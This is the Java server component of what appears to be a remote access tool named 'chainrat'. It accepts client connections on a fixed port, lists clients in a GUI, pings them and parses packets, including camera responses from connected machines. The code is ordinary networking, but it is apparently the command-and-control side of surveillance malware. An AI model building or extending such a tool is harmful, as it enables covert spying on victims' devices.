package com.nefi.chainrat.server.network;



import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.forms.frmMainController;
import com.nefi.chainrat.server.log.Log;
import com.nefi.chainrat.server.network.response.CameraResponsePacket;
import javafx.application.Platform;

import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Type;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Server implements Runnable {

    private static final int PORT = 4467;
    private Log log;
    // Hashmap to store active clients as [ID, Object]
    public static HashMap<Integer, ClientHandler> clientMap = new HashMap<>();
    // counter for clients
    static int id = 0;

    @Override
    public void run() {
        //Thread Entry
        this.log = Main.getLog();
        open();
    }

    private void open(){
        log.d(this, "Starting server...");
        try (ServerSocket listener = new ServerSocket(PORT)) {
            log.d(this, "The capitalization server is running...");
            ExecutorService pool = Executors.newFixedThreadPool(20);
            while (true) {
                //Accept Connection in new Thread
                ClientHandler myCap = new ClientHandler(listener.accept(), "client"+id);
                //Make a hashmap for my connections
                clientMap.put(id, myCap);
                //Increase ID
                id++;
                //Update UI
                Platform.runLater(new Runnable() {
                    public void run() {
                        //Get instance of main Window
                        frmMainController mainController = Main.getMainController();
                        //Update Hashmap
                        mainController.clMap = clientMap;
                        mainController.updateListview();
                    }
                });

                pool.execute(myCap);
            }
        }catch (Exception ex){
            log.d(this, "Error starting Server! Try again...");
            ex.printStackTrace();
            open();
        }
    }

    public static class ClientHandler implements Runnable {
        private static final int TIMEOUT_IN_SEC = 20;
        private static final int MAX_RETRIES = 7;
        private Socket socket;
        private Scanner in;
        private PrintWriter out;
        private Log log;
        private int timer = 255;
        private boolean connected = true;
        private int retryCounter;

        ClientHandler(Socket socket, String name) {
            this.log = Main.getLog();
            this.socket = socket;
            log.d(this, "Connected! Spawned new thread... " + socket);
        }

        public String readAsString() throws Exception{
            if(!socket.isConnected()){
                throw new Exception();
            }
            String line;
            String packetString = null;
            System.out.println("Trying to read...");
            while (in.hasNextLine()){
                line = in.nextLine();
                if (!line.equals("#")) {
                    System.out.println("From server: " + line);
                    packetString = line;
                }else {
                    return packetString;
                }
            }
            return packetString;
        }

        public boolean close(){
            try {
                log.d(this, "DISSCONNECTING THIS CLIENT");
                socket.close();
                connected = false;
                return true;
            }catch (Exception ex){
                log.d(this, "error closing Socket :(");
                return false;
            }
        }
        public IPacket read() throws Exception{
            if(!socket.isConnected()){
                throw new Exception();
            }

            log.d(this, Integer.toString(retryCounter) + " | " + Integer.toString(MAX_RETRIES));
            String sPacket = null;
            while (retryCounter < MAX_RETRIES){
                log.d(this, "Inside retry loop.");
                sPacket = readAsString();
                if(sPacket == null){
                    log.d(this, "sPacket is null #" + retryCounter);
                    this.retryCounter++;
                    if(this.retryCounter == this.MAX_RETRIES){
                        close();
                        return  null;
                    }
                }else{
                    this.retryCounter = Integer.MAX_VALUE;
                    break;
                }
            }

            log.d(this, "Sucess getting String!");

            System.out.println("Starting GSON Deserialization!");

            try{

                System.out.println("Trying to get type from packet: " + sPacket);
                JsonObject jsonObject = new Gson().fromJson(sPacket, JsonObject.class);
                String sType = jsonObject.get("type").getAsString();
                System.out.println("TYPE: " + sType);

                System.out.println("Switch...");

                IPacket myPacket = null;
                switch (sType){
                    case "CameraResponsePacket":
                        System.out.println("Inside CameraResponsePacket.");
                        myPacket = (CameraResponsePacket) fromJson(sPacket, CameraResponsePacket.class);
                        break;
                    case "PingPongPacket":
                        System.out.println( "Inside Ping trying to reply PONG");
                        myPacket = (PingPongPacket) fromJson(sPacket, PingPongPacket.class);
                        break;
                    default:
                        throw new Exception();
                }
                //Packet is not null

                //Exec command

                //reset counter
                retryCounter = 0;

                //Success
                System.out.println("Sucess!");
                return myPacket;
            }catch (Exception ex){
                System.out.println( "Desirialization failed!" );
            }
            return null;
        }

        private void createGUI() {
        }

        public boolean send(IPacket packet, Type typeOfClass){
            String msg = toJson(packet, typeOfClass);
            if(msg == null){
                return false;
            }
            if(!sendString(msg)){
                return false;
            }
            return true;
        }

        public boolean sendString(String msg){
            try {
                log.d(this, "Sending string...");
                out.println(msg);
                out.println("#");
                log.d(this, "Sending success!");
                return true;
            }catch (Exception ex){
                return false;
            }
        }

        @Override
        public void run() {
            try {
                //Incoming packets
                in = new Scanner(socket.getInputStream());
                //Outgoing connection
                out = new PrintWriter(socket.getOutputStream(), true);

                while (connected) {
                    log.d(this, "Starting network loop... - " + timer);
                    if(timer > TIMEOUT_IN_SEC){
                        log.d(this, "Time for a ping!");
                        timer = 0;
                        if(!ping()){
                            break;
                        }
                    }
                    //Sleep
                    Thread.sleep(200);
                    timer++;
                }
                log.d(this, "Closing connection thread...");
            } catch (Exception e) {
                System.out.println("Error:" + socket);
            } finally {
                try { socket.close(); } catch (IOException e) {}
                System.out.println("Closed: " + socket);
            }
        }

        private boolean ping() {
            log.d(this, "Starting ping...");
            PingPongPacket packet = new PingPongPacket();
            if(!send(packet, PingPongPacket.class)){
                return false;
            }
            log.d(this, "Ping send! Waiting for pong!");

            try {
                IPacket responsePacket = read();
                if(responsePacket == null){
                    return false;
                }
                PingPongPacket response = new PingPongPacket();
                log.d(this, "Packet recieved!");

                response = (PingPongPacket) responsePacket;
            }catch (Exception ex){
                log.d(this, "Wrong or damaged packet");
                return false;
            }

            log.d(this, "PONG! :)");
            return true;
        }

        private Object fromJson(String json, Type type){
            try {
                Object obj;
                GsonBuilder gsb = new GsonBuilder();
                Gson gson = gsb.create();
                obj = gson.fromJson(json, type);
                return obj;
            }catch (Exception ex){
                log.d(this, "Serialization FAILED!: " + ex.getMessage());
                return null;
            }

        }
        private String toJson(Object obj, Type type){
            log.d(this, "Starting JSON Serialization...");
            String out;
            try {
                GsonBuilder gsb = new GsonBuilder();
                Gson gson = gsb.create();
                out = gson.toJson(obj, type);
                return out;
            }catch (Exception ex){
                log.d(this, "Serialization FAILED!: " + ex.getMessage());
                return null;
            }
        }
    }
}
